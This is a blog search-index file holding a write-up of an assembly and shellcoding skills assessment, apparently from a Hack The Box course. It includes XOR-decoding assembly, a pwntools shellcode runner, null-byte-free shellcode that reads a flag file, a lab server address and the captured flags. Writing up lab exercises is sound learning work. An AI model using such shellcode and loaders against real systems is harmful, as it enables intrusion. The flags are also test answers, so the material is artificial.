{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to my blog","text":""},{"location":"2024/04/30/intro-to-assembly-language---skills-assessment/","title":"Intro to Assembly language - Skills Assessment","text":"<p>This post is about the end of module assessment given for an introduction to assembly language course. Those are the solutions I came up with, don't mind sending me suggestions for improvement since i'm new to this. Also, this post is mostly for me and to keep track of my progress over time.</p>","tags":["assembly","binary","shellcoding"]},{"location":"2024/04/30/intro-to-assembly-language---skills-assessment/#task-1","title":"Task 1","text":"<p>For the first task, we're given a binary called loaded_shellcode. We have to dissassemble it, modify the assembly code to decode the shellcode loaded in it, then execute it to get the flag. The decoding key is stored in the register rbx (Callee Saved)</p> <p>To dissassemble the .text section :  </p> <p><code>objdump -M intel --no-show-raw-insn --no-addresses -d loaded_shellcode</code></p> <pre><code>&lt;_start&gt;:\n        movabs rax,0xa284ee5c7cde4bd7\n        push   rax\n        movabs rax,0x935add110510849a\n        push   rax\n        movabs rax,0x10b29a9dab697500\n        push   rax\n        movabs rax,0x200ce3eb0d96459a\n        push   rax\n        movabs rax,0xe64c30e305108462\n        push   rax\n        movabs rax,0x69cd355c7c3e0c51\n        push   rax\n        movabs rax,0x65659a2584a185d6\n        push   rax\n        movabs rax,0x69ff00506c6c5000\n        push   rax\n        movabs rax,0x3127e434aa505681\n        push   rax\n        movabs rax,0x6af2a5571e69ff48\n        push   rax\n        movabs rax,0x6d179aaff20709e6\n        push   rax\n        movabs rax,0x9ae3f152315bf1c9\n        push   rax\n        movabs rax,0x373ab4bb0900179a\n        push   rax\n        movabs rax,0x69751244059aa2a3\n        push   rax\n        movabs rbx,0x2144d2144d2144d2\n</code></pre> <p>The encoded shellcode is loaded by initializing the register rax with a value, then pushing it into the stack. This process is repeated 14 times. At the end, the decoding key is set into the Callee Saved register rbx.</p> <p>The quickest/easiest approach would be to pop the values from the stack, xor them with the key in rbx and loop these steps 14 times. After that, load the program in a debugger and take note of the decoded value at each step. I wanted to make it just a little more fun by making a procedure that will do these steps, but will also print the entire decoded shellcode in my terminal, ready to be executed as is.</p> <p>The approach I came up with is: - pop the current stack pointer rsp into a register not used (rdx in my case) - xor it with the value in rbx - print the value in rdx with libc functions printf and fflush - loop these steps 14 times</p> <p>The format specifier used for printf:  <code>outFormat db  \"%016llx\", 0x00</code></p> <ul> <li>0 : to pad the output with zeroes intead of spaces if minimum width is not met</li> <li>16 : field width specifier of 16 characters, will be padded to the left with zeros.</li> <li>ll : length modifier long long int.</li> <li>x : lowercase hexadecimal integer</li> <li>0x00 is the string terminator in printf</li> </ul> <p>This is necessary because for example, one of the values is: 14831ff40b70148 instead of 014831ff40b70148 which would break the shellcode if I didn't pad the extra 0.</p> <p>Also, to be able to print all the values on the same line, I need to call fflush to flush all streams or else, I'd have to print on a new line instead.</p> <p>Once this is all put together : </p> <p><pre><code>global _start\nextern printf, fflush               ; Import external libc functions printf and fflush\n\nsection .data\n    outFormat db  \"%016llx\", 0x00   ; Set the format specifier for printf\n\nsection .text\n_start:\n    mov rax,0xa284ee5c7cde4bd7\n    push   rax\n    mov rax,0x935add110510849a\n    push   rax\n    mov rax,0x10b29a9dab697500\n    push   rax\n    mov rax,0x200ce3eb0d96459a\n    push   rax\n    mov rax,0xe64c30e305108462\n    push   rax\n    mov rax,0x69cd355c7c3e0c51\n    push   rax\n    mov rax,0x65659a2584a185d6\n    push   rax\n    mov rax,0x69ff00506c6c5000\n    push   rax\n    mov rax,0x3127e434aa505681\n    push   rax\n    mov rax,0x6af2a5571e69ff48\n    push   rax\n    mov rax,0x6d179aaff20709e6\n    push   rax\n    mov rax,0x9ae3f152315bf1c9\n    push   rax\n    mov rax,0x373ab4bb0900179a\n    push   rax\n    mov rax,0x69751244059aa2a3\n    push   rax\n    mov rbx,0x2144d2144d2144d2\n\n    mov rcx, 14                     ; Set the Loop Counter to 14\n\nprintDecode:                        ; Start of new procedure printDecode\n\n    pop rdx                         ; Pop the current stack pointer to rdx\n    xor rdx, rbx                    ; Decode rdx using the key in rbx\n\n    push rcx                        ; Push registers to stack before calling the printf function\n    push rdx                        \n    push rbx\n\n    mov rdi, outFormat              ; Set the first printf argument (format specifier)\n    mov rsi, rdx                    ; Set the second printf argument (value to print)\n    call printf                     ; printf(outFormat, rdx)\n\n    xor  rdi, rdi                   ; Setting rdi to zero\n    call fflush                     ; Flush all streams\n\n    pop rbx                         ; Restore registers from stack\n    pop rdx\n    pop rcx\n\n    loop printDecode                ; Loop this procedure until rcx reaches 0\n\nexit:                               ; Exit procedure\n    xor rax, rax\n    add al, 60\n    xor dil, dil\n    syscall\n</code></pre> Assemble the code, do dynamic linking with libc and execute it using :  <code>nasm -f elf64 flag.s &amp;&amp;  ld flag.o -o flag -lc --dynamic-linker /lib64/ld-linux-x86-64.so.2 &amp;&amp; ./flag</code></p> <p>Result :  <pre><code>nasm -f elf64 flag.s &amp;&amp;  ld flag.o -o flag -lc --dynamic-linker /lib64/ld-linux-x86-64.so.2 &amp;&amp; ./flag\n4831c05048bbe671167e66af44215348bba723467c7ab51b4c5348bbbf264d344bb677435348bb9a10633620e771125348bbd244214d14d244214831c980c1044889e748311f4883c708e2f74831c0b0014831ff40b7014831f64889e64831d2b21e0f054831c04883c03c4831ff0f05\n</code></pre></p> <p>To execute the shellcode, I'll use the pwntools library in python: <pre><code>from pwn import *\ncontext(os=\"linux\", arch=\"amd64\", log_level=\"error\")\nrun_shellcode(unhex('SHELLCODE')).interactive()\n</code></pre></p> <p>I can then execute the shellcode, which will print the flag :</p> <pre><code>python loader.py '4831c05048bbe671167e66af44215348bba723467c7ab51b4c5348bbbf264d344bb677435348bb9a10633620e771125348bbd244214d14d244214831c980c1044889e748311f4883c708e2f74831c0b0014831ff40b7014831f64889e64831d2b21e0f054831c04883c03c4831ff0f05'\nHTB{4553mbly_d3bugg1ng_m4573r}$\n</code></pre>","tags":["assembly","binary","shellcoding"]},{"location":"2024/04/30/intro-to-assembly-language---skills-assessment/#task-2","title":"Task 2","text":"<p>For the second task, in a binary exploitation exercise, we get to the point where we have to run our shellcode. A buffer space of 50 bytes is available. The exercice consist of optimizing the given assembly code to make it shellcode-ready and under 50 bytes.</p> <p>Before starting, a quick reminder about shellcoding requirements : </p> <ol> <li>Does not contain variables</li> <li>Does not refer to direct memory addresses</li> <li>Does not contain any NULL bytes <code>00</code></li> </ol> <p>The provided assembly code :</p> <pre><code>global _start\n\nsection .text\n_start:\n    ; push './flg.txt\\x00'\n    push 0              ; push NULL string terminator\n    mov rdi, '/flg.txt' ; rest of file name\n    push rdi            ; push to stack \n\n    ; open('rsp', 'O_RDONLY')\n    mov rax, 2          ; open syscall number\n    mov rdi, rsp        ; move pointer to filename\n    mov rsi, 0          ; set O_RDONLY flag\n    syscall\n\n    ; read file\n    lea rsi, [rdi]      ; pointer to opened file\n    mov rdi, rax        ; set fd to rax from open syscall\n    mov rax, 0          ; read syscall number\n    mov rdx, 24         ; size to read\n    syscall\n\n    ; write output\n    mov rax, 1          ; write syscall\n    mov rdi, 1          ; set fd to stdout\n    mov rdx, 24         ; size to read\n    syscall\n\n    ; exit\n    mov rax, 60\n    mov rdi, 0\n    syscall\n</code></pre> <p>Using this python code, we can generate our shellcode from the binary : </p> <pre><code>#!/usr/bin/python3\n\nimport sys\nfrom pwn import *\n\ncontext(os=\"linux\", arch=\"amd64\", log_level=\"error\")\n\nfile = ELF(sys.argv[1])\nshellcode = file.section(\".text\")\nprint(shellcode.hex())\n\nprint(\"%d bytes - Found NULL byte\" % len(shellcode)) if [i for i in shellcode if i == 0] else print(\"%d bytes - No NULL bytes\" % len(shellcode))\n</code></pre> <p>This is the current result :  <pre><code>python shellcoder.py flag\n6a0048bf2f666c672e74787457b8020000004889e7be000000000f05488d374889c7b800000000ba180000000f05b801000000bf01000000ba180000000f05b83c000000bf000000000f05\n75 bytes - Found NULL byte\n</code></pre></p> <p>Using pwn disasm we can see the instructions from the shellcode : </p> <pre><code>\npwn disasm '6a0048bf2f666c672e74787457b8020000004889e7be000000000f05488d374889c7b800000000ba180000000f05b801000000bf01000000ba180000000f05b83c000000bf000000000f05' -c 'amd64'\n   0:    6a 00                    push 0x0\n   2:    48 bf 2f 66 6c 67 2e 74 78 74    movabs rdi,  0x7478742e676c662f\n   c:    57                       push rdi\n   d:    b8 02 00 00 00           mov eax,  0x2\n  12:    48 89 e7                 mov rdi,  rsp\n  15:    be 00 00 00 00           mov esi,  0x0\n  1a:    0f 05                    syscall\n  1c:    48 8d 37                 lea rsi,  [rdi]\n  1f:    48 89 c7                 mov rdi,  rax\n  22:    b8 00 00 00 00           mov eax,  0x0\n  27:    ba 18 00 00 00           mov edx,  0x18\n  2c:    0f 05                    syscall\n  2e:    b8 01 00 00 00           mov eax,  0x1\n  33:    bf 01 00 00 00           mov edi,  0x1\n  38:    ba 18 00 00 00           mov edx,  0x18\n  3d:    0f 05                    syscall\n  3f:    b8 3c 00 00 00           mov eax,  0x3c\n  44:    bf 00 00 00 00           mov edi,  0x0\n  49:    0f 05                    syscall\n</code></pre> <p>As expected, we're exceeding 50 bytes and the shellcode contains NULL bytes (each 00 represents a null byte that needs to be removed).</p> <p>Here's the list of changes made to respect the requirements: - Line 1: replace <code>push 0</code> by <code>xor rsi, rsi</code> followed by <code>push rsi</code>. This will still push 0 to the stack and will replace <code>mov rsi, 0</code> from line 13. - Line 11: <code>mov al, 2</code> to use the 1-byte register instead of the 8-byte rax. - Line 18: replace <code>mov rdi, rax</code> by <code>mov edi, eax' to use 4-byte size registers. - Line 19: replace</code>mov rax, 0<code>by</code>xor al, al<code>to set the Syscall number to 0. - Line 21: replace</code>mov rdx, 24<code>by</code>mov dl, 24<code>to use a 2-byte register, per needed. - Line 24-25: replace</code>mov rax, 1<code>and</code>mov rdi, 1<code>by</code>mov al, 1<code>and</code>mov dil, 1<code>to use 1-byte registers. - Line 26: remove</code>mov rdx, 24` since the value is alredy set previously.</p> <p>This is the final code: <pre><code>global _start\n\nsection .text\n_start:\n    ; push './flg.txt\\x00'\n    xor rsi, rsi            ; set rsi to 0\n    push rsi                ; push NULL string terminator\n    mov rdi, '/flg.txt'     ; set the file name\n    push rdi                ; push file name to stack\n\n    ; open('rsp', 'O_RDONLY')\n    ; rsi '0_RDONLY' is already set to 0 from previous instructions\n    mov al, 2               ; open syscall number\n    mov rdi, rsp            ; move pointer to filename\n    syscall                 \n\n    ; read file\n    lea rsi, [rdi]          ; pointer to opened file\n    mov edi, eax            ; set fd to rax from open syscall\n    xor al, al              ; read syscall number\n    mov dl, 24              ; size to read\n    syscall\n\n    ; write output\n    mov al, 1               ; write syscall\n    mov dil, 1              ; set fd to stdout\n    syscall\n</code></pre></p> <p>If I generate the shellcode and check for null bytes this is the result : <pre><code>python shellcoder.py flag\n4831f65648bf2f666c672e74787457b0024889e70f05488d3789c730c0b2180f05b00140b7010f05\n40 bytes - No NULL bytes\n</code></pre></p> <p>Finally, if I send the shellcode to the server the flag is returned : <pre><code>$ nc 94.237.63.201 58840\n4831f65648bf2f666c672e74787457b0024889e70f05488d3789c730c0b2180f05b00140b7010f05\nHTB{5h3llc0d1ng_g3n1u5}\n</code></pre></p>","tags":["assembly","binary","shellcoding"]},{"location":"archive/2024/","title":"2024","text":""},{"location":"category/writeups/","title":"Writeups","text":""}]}